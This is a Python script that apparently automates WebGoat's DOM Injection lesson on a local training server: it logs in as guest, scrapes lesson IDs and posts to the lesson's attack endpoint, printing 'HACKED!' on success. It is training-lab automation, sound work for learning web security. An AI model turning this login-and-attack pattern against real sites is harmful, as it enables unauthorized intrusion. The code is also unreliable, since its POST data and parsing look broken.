import re
import sys
import json
import requests
import argparse

def dom_injection(file_name):

	#start my own session
	session = requests.Session()
	
	#Get access to the webgoat login page
	webgoat_session = session.get('http://127.0.0.1:8080/WebGoat/login.mvc')

	try:
		#need to store the anonymous session token
		cookie = webgoat_session.cookies

		input_parameters = {'username': 'guest', 'password': 'guest'}
		
		#Use the values below to log into the appropriate website with stored input_parameters
		result = session.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=' + str(cookie['JSESSIONID']), data = input_parameters)


		#The below code takes the main website and piece by piece parses out the menu and screen value. 
		webgoat_full_screen = session.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc')
		webgoat_screen_menu = webgoat_full_screen.text.split('DOM Injection')
		webgoat_parsed_menu = webgoat_screen_menu[1].split("Screen=")
		extracted_screen_val = webgoat_parsed_menu[1].split("&menu=")
		screen_val_int = extracted_screen_val[0]
		extracted_menu_val = extracted_screen_val[1].split("\"")
		menu_val_int = extracted_menu_val[0]

		# print screen_val_int
		# print extracted_menu_val

		#Store the vulnerable page which we are trying to access from webgoat
		vulnerable_page = session.get('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screen_val_int + '&menu=' + menu_val_int)
		

		#find the first letter of the name on the account
		input_parameters = {'4'}
		post_4 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screen_val_int + '&menu=' + menu_val_int, data = input_parameters)

		input_parameters = {'42'}
		post_42 = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screen_val_int + '&menu=' + menu_val_int, data = input_parameters)
		
		post_42_screen = post_42.text.split("Screen=")
		post_42_menu = post_42.text.split("&menu=")
		screen_val_int = post_42_screen[0]
		extracted_menu_val = post_42_menu[1].split("\'")
		menu_val_int = extracted_menu_val[0]
		final_post = session.post('http://127.0.0.1:8080/WebGoat/attack?Screen=' + screen_val_int + '&menu=' + menu_val_int, data = input_parameters)

		#if this prints that means that we have successfully guessed the name
		if "* Congratulations. You have successfully completed this lesson." in final_post.text:
			
			print 'HACKED!'
		
	except Exception as e:
		print e

file_name = "Vuln-45.attack"
dom_injection(file_name)



